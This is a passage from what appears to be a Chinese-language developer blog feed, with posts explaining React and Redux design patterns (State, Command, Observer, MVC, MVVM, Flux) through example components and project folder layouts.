class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Iterator Pattern Example<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ListComponent</span> <span class="attr">items</span>=<span class="string">&#123;items&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">IteratorComponent</span> <span class="attr">iterable</span>=<span class="string">&#123;items&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="State-Pattern"><a href="#State-Pattern" class="headerlink" title="State Pattern"></a>State Pattern</h2><p>當提到 React 的狀態模式 (State Pattern)，通常指的是 React 的內建狀態管理機制，在 React 中每個元件都可以擁有自己的狀態，並且通過特定方式來管理和更新。</p><p>React 透過狀態和 setState 方法，提供便捷的方式來管理和更新狀態:</p><ul><li>Component State (元件狀態): 狀態是純 JavaScript 物件在元件內部進行初始化和更新，用於儲存元件所需數據</li><li>setState (修改狀態的方法): setState 接受新的狀態物件或一個 callback function 來計算新狀態並更新元件，這個過程是非同步操作，會將更新一次性進行批次處理以提高性能</li><li>Immutability (不可變性): 在更新狀態時，應該建立新的狀態物件，可以幫助 React 更好地處理狀態變化，進行有效的重新渲染，確保狀態的可預測性和性能優化</li><li>State Lifting (狀態提升): 當多個元件需要共享狀態或進行狀態同步時，可以將狀態提升到共同父元件中，使狀態在元件樹中傳遞，從而實現元件間的數據的共用和溝通，使得元件間的狀態共享和溝通變得更加靈活和可控</li></ul><p>需要注意的是，React 的狀態模式適用於較小規模的應用和較簡單的元件間溝通，對於大型應用和較複雜的狀態管理需求，可以考慮使用 Redux 或是 zuszand 來搭配 React 使用。</p><p>接下來舉一個簡單的購物車應用，包含兩個元件:</p><ul><li>ProductList: 顯示可用的商品列表，每個商品都有一個 “加入購物車” 的按鈕<ul><li>addToCart: 是一個函數，用於將商品添加到購物車中</li><li>當按下 “加入購物車” 的按鈕時，透過 handleAddToCart 函數，將商品傳遞給 addToCart 函數</li></ul></li><li>ShoppingCart 顯示已選擇的商品列表以及總價格<ul><li>cartItems: 該屬性是已選擇的商品列表，會根據 cartItems 計算總價格並顯示在頁面上</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">ProductList</span> = (<span class="params">&#123; addToCart &#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> products = [</span><br><span class="line">    &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&quot;Product 1&quot;</span>, <span class="attr">price</span>: <span class="number">10</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">id</span>: <span class="number">2</span>, <span class="attr">name</span>: <span class="string">&quot;Product 2&quot;</span>, <span class="attr">price</span>: <span class="number">20</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">id</span>: <span class="number">3</span>, <span class="attr">name</span>: <span class="string">&quot;Product 3&quot;</span>, <span class="attr">price</span>: <span class="number">30</span> &#125;,</span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">handleAddToCart</span> = (<span class="params">product</span>) =&gt; &#123;</span><br><span class="line">    <span class="title function_">addToCart</span>(product);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Product List<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;products.map((product) =&gt; (</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&#123;product.id&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &#123;product.name&#125; - $&#123;product.price&#125;</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> handleAddToCart(product)&#125;&gt;</span></span><br><span class="line"><span class="language-xml">              Add to Cart</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        ))&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">ShoppingCart</span> = (<span class="params">&#123; cartItems &#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> totalPrice = cartItems.<span class="title function_">reduce</span>(<span class="function">(<span class="params">total, item</span>) =&gt;</span> total + item.<span class="property">price</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Shopping Cart<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;cartItems.map((item) =&gt; (</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&#123;item.id&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &#123;item.name&#125; - $&#123;item.price&#125;</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        ))&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>Total Price: $&#123;totalPrice&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>App 用於提升狀態，將狀態 cartItems 提升到 App 元件中，並通過 props 傳遞給子元件 ProductList 和 ShoppingCart，讓兩個元件共享購物車的狀態，實現了商品的添加和顯示功能。</p><ul><li>cartItems: 被提升用於儲存已選擇的商品列表<ul><li>ShoppingCart 元件可以使用從 App 元件傳遞的 cartItems 狀態</li><li>addToCart 函數將商品添加到購物車中並更新 cartItems 的狀態</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; useState &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ProductList</span> <span class="keyword">from</span> <span class="string">&quot;./ProductList&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ShoppingCart</span> <span class="keyword">from</span> <span class="string">&quot;./ShoppingCart&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">App</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [cartItems, setCartItems] = <span class="title function_">useState</span>([]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">addToCart</span> = (<span class="params">product</span>) =&gt; &#123;</span><br><span class="line">    <span class="title function_">setCartItems</span>([...cartItems, product]);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ProductList</span> <span class="attr">addToCart</span>=<span class="string">&#123;addToCart&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ShoppingCart</span> <span class="attr">cartItems</span>=<span class="string">&#123;cartItems&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></table></figure><h2 id="Command-Pattern-命令模式"><a href="#Command-Pattern-命令模式" class="headerlink" title="Command Pattern (命令模式)"></a>Command Pattern (命令模式)</h2><p>在 Command 模式中，可以將每個操作都視為一個命令 (Command)，並將其表示為一個動作 (Action)，舉個在 Redux 中的例子:</p><ol><li><p>Action: 在 Redux 中，動作是一個 Javascript 物件，它描述了要執行的操作類型和相關的資料，每個動作都應該有一個唯一的類型，例如 ADD_TODO 或 REMOVE_TODO。</p></li><li><p>Action Creators: Action creator 是建立和封裝命令 (Command) 的函數，它接收必要的參數，並返回一個包含類型和資料的動作 (Action) 物件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">doAddToDoItem</span>(<span class="params">text</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">type</span>: <span class="string">&quot;ADD_TODO&quot;</span>, <span class="attr">payload</span>: text &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Redux Thunk 或 Redux Saga: 屬於 middleware 讓我們可以用非同步的方式處理並發出適當的動作 (Action)。</p></li></ol><p>總結來說，在 Redux 中，我們可以將每個操作視為一個命令 (Command)，並使用 Action Creators 和 middleware 來建立和執行這些命令。</p><h2 id="Observer-Pattern-觀察者模式"><a href="#Observer-Pattern-觀察者模式" class="headerlink" title="Observer Pattern (觀察者模式)"></a>Observer Pattern (觀察者模式)</h2><p>Observer Pattern 的目的是建立一對多的依賴關係，當被觀察者 (Subject) 的狀態發生變化時，所有觀察者 (Observers) 都會被通知並進行相應的更新。</p><p>舉一個 Redux 和 React Redux 的例子，React Redux 提供了一個 <code>connect</code> 函數，這個函數將 React 元件與 Redux Store 的狀態連接起來，並將狀態變化傳遞給相應的元件，當 Redux 的狀態發生變化時，被連接的 React 元件將收到通知並進行更新，這樣可以實現元件之間的狀態共享和溝通，達到類似觀察者模式的效果。</p><p>舉個例子，底下程式定義了 counter 的 slice，並設置了初始狀態為 0，同時定義了 increment 和 decrement 兩個 reducer 函數，它們分別處理增加和減少計數器的邏輯。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createSlice &#125; <span class="keyword">from</span> <span class="string">&quot;@reduxjs/toolkit&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> counterSlice = <span class="title function_">createSlice</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;counter&quot;</span>,</span><br><span class="line">  <span class="attr">initialState</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">reducers</span>: &#123;</span><br><span class="line">    <span class="attr">increment</span>: <span class="function">(<span class="params">state</span>) =&gt;</span> state + <span class="number">1</span>,</span><br><span class="line">    <span class="attr">decrement</span>: <span class="function">(<span class="params">state</span>) =&gt;</span> state - <span class="number">1</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> &#123; increment, decrement &#125; = counterSlice.<span class="property">actions</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> counterSlice.<span class="property">reducer</span>;</span><br></pre></td></tr></table></figure><p>在 React 元件中使用 useDispatch 和 useSelector hook 來操作 Redux store:</p><ul><li>useSelector: 選擇並訪問 Redux store 中的 counter 狀態</li><li>useDispatch: 取得 dispatch 函數，可以用來調度 Redux store 中的動作</li></ul><p>這樣，使用 createSlice 和 React Redux 配合使用，就能在 React 元件中使用觀察者模式的效果，實現狀態管理和元件間的溝通。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; useDispatch, useSelector &#125; <span class="keyword">from</span> <span class="string">&quot;react-redux&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; increment, decrement &#125; <span class="keyword">from</span> <span class="string">&quot;./counterSlice&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">CounterDisplay</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> counter = <span class="title function_">useSelector</span>(<span class="function">(<span class="params">state</span>) =&gt;</span> state.<span class="property">counter</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Counter: &#123;counter&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">CounterControls</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> dispatch = <span class="title function_">useDispatch</span>();</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> dispatch(increment())&#125;&gt;Increment<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> dispatch(decrement())&#125;&gt;Decrement<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript Structural Pattern For Project</title>
      <link href="/2023/05/30/js-pattern/js-structure-pattern-for-project/"/>
      <url>/2023/05/30/js-pattern/js-structure-pattern-for-project/</url>
      
        <content type="html"><![CDATA[<p>這篇文章接下來會讓優化從開資料夾開始，從優化專案結構的三種設計模式切入</p><ul><li>Model View Controller Pattern (MVC)</li><li>Model-View-ViewModel Pattern (MVVM)</li><li>Flux Pattern</li></ul><p>Design Patterns 依照目的分成三群：</p><ul><li><a href="https://linyencheng.github.io/2023/02/25/js-pattern/js-creational-pattern/">Creational Patterns 創建型</a></li><li>Structural Patterns 結構型，結構型設計模式根據實際情況會分成三種:<ul><li><a href="https://linyencheng.github.io/2023/03/29/js-pattern/js-structure-pattern-for-programming-syntax/">優化語法</a></li><li><a href="https://linyencheng.github.io/2023/04/02/js-pattern/js-structure-pattern-for-code/">優化程式碼結構</a></li><li><a href="https://linyencheng.github.io/2023/05/30/js-pattern/js-structure-pattern-for-project/">優化專案結構</a></li></ul></li><li>Behavioural Patterns 行為型</li></ul><h3 id="Model-View-Controller-Pattern-MVC"><a href="#Model-View-Controller-Pattern-MVC" class="headerlink" title="Model View Controller Pattern (MVC)"></a>Model View Controller Pattern (MVC)</h3><p>Model View Controller (MVC) 模式是一種用於管理程式的結構和邏輯，提供定義清晰的架構，開發上能夠更容易地理解、擴展和測試，架構主要分為三個部分：</p><ul><li>Model: 處理數據的讀取、寫入和驗證等業務邏輯操作</li><li>View: 處理數據的顯示和呈現以及用戶互動，可以是 HTML 樣板、頁面元素</li><li>Controller: 接收來自界面的輸入和事件，並根據這些輸入和事件來更新模型和 UI</li></ul><p>MVC 是將應用程式的邏輯、數據和界面分離，達到結構化和可重用性。</p><ol><li>第一種是依照資料表去做區分，把同個資料表的 model、controller、route 集中存放，覺得較適合大型專案。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">├── src/</span><br><span class="line">│  ├── entities/                <span class="comment"># 按照資料表去區分</span></span><br><span class="line">│  │  └── user/                 <span class="comment"># 使用者表</span></span><br><span class="line">│  │     ├── model.js           <span class="comment"># Schema 定義</span></span><br><span class="line">│  │     ├── controller.js      <span class="comment"># 資料庫 CRUD</span></span><br><span class="line">│  │     └── route.js           <span class="comment"># API 設定</span></span><br><span class="line">│  └── index.js                 <span class="comment"># 入口</span></span><br><span class="line">├── .eslintrc                   <span class="comment"># ESLint 設定檔</span></span><br><span class="line">├── package-lock.json</span><br><span class="line">├── package.json</span><br><span class="line">└── README.md</span><br></pre></td></tr></table></figure><ol start="2"><li>第二種則是依照功能性，controller、routes、models 集中放置在各自的分類資料夾，覺得較適合小型專案。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">├── src/</span><br><span class="line">│  ├── controller/              <span class="comment"># 資料庫 CRUD</span></span><br><span class="line">│  ├── routes/                  <span class="comment"># API 設定</span></span><br><span class="line">│  ├── models/                  <span class="comment"># Schema 定義</span></span><br><span class="line">│  └── index.js                 <span class="comment"># 程式入口</span></span><br><span class="line">├── .eslintrc                   <span class="comment"># ESLint 設定檔</span></span><br><span class="line">├── package-lock.json</span><br><span class="line">├── package.json</span><br><span class="line">└── README.md</span><br></pre></td></tr></table></figure><h3 id="Model-View-ViewModel-Pattern-MVVM"><a href="#Model-View-ViewModel-Pattern-MVVM" class="headerlink" title="Model-View-ViewModel Pattern (MVVM)"></a>Model-View-ViewModel Pattern (MVVM)</h3><p>Model-View-ViewModel Pattern (MVVM) 著重在開發的關注點分離並提供單向或是雙向的 Data Binding 來控制 UI 的顯示邏輯。</p><ul><li>Model: 定義資料結構，執行資料操作，在 React 中通常是元件中或是 Store 裡的狀態</li><li>View (stateless): UI 介面，根據 ViewModel 來顯示，實際上的 HTML element 由 JSX 背後的 virtual dom 所控制</li><li>ViewModel (stateful): 處理 Model 和 View 之間的溝通，用來維護 UI 的狀態，在 React 中的 JSX 就是扮演這個腳色</li></ul><p>一個常見的 MVVM 資料流：</p><ol><li>ViewModel 從 Model 擷取資料並準備在 View 顯示</li><li>View 把和 ViewModel binding 的資料顯示在 UI 中</li><li>透過 View 觸發命令或輸入事件</li><li>ViewModel 監控互動並執行資料操作並更新 Model</li><li>如果 Model 資料變更，ViewModel 會通知視圖讓 UI 重新渲染</li></ol><h3 id="Flux-Pattern"><a href="#Flux-Pattern" class="headerlink" title="Flux Pattern"></a>Flux Pattern</h3><p>Flux pattern 是由 Facebook 提出將狀態中央化管理的機制，定義了單向資料流的架構明確將程式分為四個核心概念：</p><ul><li>Actions: 描述事件，例如使用者操作或 API 請求完成，由 type 和 payload 組成</li><li>Dispatcher: 提供中央管理的機制，用於接收和發送 Actions，當事件發生時，Actions 會被集中到 Dispatcher 並操作對應的 Store</li><li>Stores: 負責存儲和管理應用程式的狀態，只接受 Dispatcher 過來的 Actions，並根據 Action Type 來更新狀態</li><li>Views: UI 訂閱 Store 的變化，並依據狀態來更新。當用戶進行操作時，UI 會產生 Action 並送到 Dispatcher 中去跟 Store 互動</li></ul><p>搭配 Redux 後，主要就是增加元件之間需要溝通工具，會有以下特性:</p><ul><li>單向資料流</li><li>公共的狀態儲存 (Store)</li></ul><p>專案架構也會受到這種概念去分類:</p><ul><li>actions: 觸發狀態改變用的 function</li><li>pages: 頁面容器元件</li><li>containers: 有連接 Store</li><li>components: 沒有連接 Store</li><li>reducers: 收到 action 後的資料邏輯</li></ul><p>所以專案資料夾架構依照屬性去分類就會長成下面這個樣子，在完成任務的過程中需要在多個不同的資料夾中來回，覺得較適合小型專案。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">└── src</span><br><span class="line">    ├── actions</span><br><span class="line">    │   ├── typeOneActions.js</span><br><span class="line">    │   └── typeTwoActions.js</span><br><span class="line">    ├── api</span><br><span class="line">    │   ├── apiHandler.js</span><br><span class="line">    │   ├── typeOneApi.js</span><br><span class="line">    │   └── typeTwoApi.js</span><br><span class="line">    ├── components</span><br><span class="line">    │   ├── TypeOneComponent.jsx</span><br><span class="line">    │   ├── TypeOneListComponent.jsx</span><br><span class="line">    │   ├── TypeTwoComponent.jsx</span><br><span class="line">    │   ├── TypeTwoPageComponent.jsx</span><br><span class="line">    │   └── HomePageComponent.jsx</span><br><span class="line">    ├── containers</span><br><span class="line">    │   ├── TypeOneContainer.js</span><br><span class="line">    │   └── TypeTwoPageContainer.js</span><br><span class="line">    ├── pages</span><br><span class="line">    │   └── HomePageContainer.js</span><br><span class="line">    ├── index.js</span><br><span class="line">    ├── reducers</span><br><span class="line">    │   ├── typeOneReducer.js</span><br><span class="line">    │   └── typeTwoReducer.js</span><br><span class="line">    ├── routes.js</span><br><span class="line">    ├── store.js</span><br><span class="line">    └── utils</span><br></pre></td></tr></table></figure><p>以<a href="https://github.com/LinYenCheng/heros">之前弄的小專案</a>當例子，如果有加上 redux 的話，專案架構大概會長成下面的樣子，在比較簡單的專案中可以更簡化。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">├── .storybook</span><br><span class="line">├── src/</span><br><span class="line">│  ├── constants/</span><br><span class="line">│  ├── utils/</span><br><span class="line">│  ├── pages/</span><br><span class="line">│  ├── containers/              <span class="comment"># containers 放置與 Redux 連接的相關元件，單元測試檔案為 `元件名稱.test.js`</span></span><br><span class="line">│  ├── components/              <span class="comment"># components 放置相關元件，單元測試檔案為 `元件名稱.test.js`</span></span><br><span class="line">│  │  └── Root.js               <span class="comment"># 路由根目錄</span></span><br><span class="line">│  ├── hooks/                   <span class="comment"># hooks 相關</span></span><br><span class="line">│  ├── middleware/              <span class="comment"># 資料處理相關</span></span><br><span class="line">│  │  ├── API.js                <span class="comment"># axios 的 instance</span></span><br><span class="line">│  │  └── redux-api.js          <span class="comment"># redux-api</span></span><br><span class="line">│  ├── styles/                  <span class="comment"># 樣式檔們</span></span><br><span class="line">│  ├── index.js                 <span class="comment"># 程式入口</span></span><br><span class="line">│  ├── serviceWorker.js</span><br><span class="line">│  └── setupTests.js            <span class="comment"># 測試相關設定</span></span><br><span class="line">├── .eslintrc                   <span class="comment"># ESLint 設定檔</span></span><br><span class="line">├── .prettierrc                 <span class="comment"># prettierrc 工具設定</span></span><br><span class="line">├── .travis.yml                 <span class="comment"># 持續發佈工具</span></span><br><span class="line">├── package-lock.json</span><br><span class="line">├── package.json</span><br><span class="line">└── README.md</span><br></pre></td></tr></table></figure><p>在使用 Redux 的時候，我們通常要同時維護 reducer 以及 action，如果還要搭配 API 進行，又會需要多維護一個 middleware。</p><p>可是在簡單的專案中，絕大多數時候我們進行的工作都是類似的，官方也有相關的建議，甚至後來還推出了 toolkit 來協助寫法簡化。</p><p>簡單來說，本來要維護三個地方，現在變成只要維護一份配置檔就好了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">src</span><br><span class="line">└── features</span><br><span class="line">    ├── typeOne</span><br><span class="line">    │   ├── TypeOne.js</span><br><span class="line">    │   ├── TypeOne.styles.scss</span><br><span class="line">    │   └── typeOneSlice.js</span><br><span class="line">    ├── typeTwo</span><br><span class="line">    │   ├── TypeTwo.js</span><br><span class="line">    │   ├── TypeTwo.styles.scss</span><br><span class="line">    │   └── typeTwoSlice.js</span><br><span class="line">    └── typeThree</span><br><span class="line">        ├── TypeThree.js</span><br><span class="line">        ├── TypeThree.styles.scss</span><br><span class="line">        └── typeThreeSlice.js</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript Structural Pattern For Code</title>
      <link href="/2023/04/02/js-pattern/js-structure-pattern-for-code/"/>
      <url>/2023/04/02/js-pattern/js-structure-pattern-for-code/</url>
      
